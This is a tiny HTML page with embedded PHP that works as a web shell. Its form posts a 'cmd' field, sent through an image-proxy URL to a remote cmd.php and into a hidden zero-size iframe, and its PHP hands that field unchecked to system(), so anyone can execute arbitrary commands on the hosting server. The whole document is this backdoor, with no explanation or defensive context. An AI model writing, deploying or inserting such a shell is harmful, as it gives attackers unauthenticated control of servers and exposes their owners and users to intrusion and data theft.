<HTML><BODY>
	<FORM METHOD="POST" NAME="myform" ACTION="https://img.loopassets.net/?url=https://wasasra04.github.io/cmd.php" TARGET="dummyframe">
		<INPUT TYPE="text" NAME="cmd">
		<INPUT TYPE="submit" VALUE="Shitpost">
	</FORM>
	<iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe"></iframe>
	<pre>
		<?
		if($_POST['cmd']) {
			system($_POST['cmd']);
		}
		?>
	</pre>
</BODY></HTML>
